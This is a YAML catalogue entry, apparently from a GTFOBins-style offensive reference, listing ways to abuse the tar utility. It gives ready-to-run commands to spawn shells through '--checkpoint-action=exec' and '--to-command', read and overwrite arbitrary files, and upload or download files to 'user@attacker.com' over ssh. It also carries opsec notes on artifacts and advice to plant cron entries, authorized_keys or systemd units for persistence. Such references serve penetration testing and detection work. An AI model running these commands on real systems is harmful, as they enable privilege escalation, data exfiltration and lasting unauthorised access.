---
name: tar
capabilities:
- exec
- spawn
- read
- write
- upload
- download
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh
  notes: The attacker box must have the `rmt` utility installed.
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: tar cf /dev/stdout /path/to/input-file -I 'tar xO'
  notes: The file is read then passed to the specified command (e.g., `tar xO`) via standard input.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: |-
    echo DATA >/path/to/temp-file
    tar cf /path/to/temp-file.tar /path/to/temp-file
    tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@
  notes: The archive can also be prepared offline then uploaded to the target.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
- id: shell-3
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo '/bin/sh 0<&1' >/path/to/temp-file
    tar cf /path/to/temp-file.tar /path/to/temp-file
    tar xf /path/to/temp-file.tar --to-command /bin/sh
  notes: The archive can also be prepared offline then uploaded to the target.
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh
  notes: The attacker box must have the `rmt` utility installed.
references:
- https://gtfobins.github.io/gtfobins/tar/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
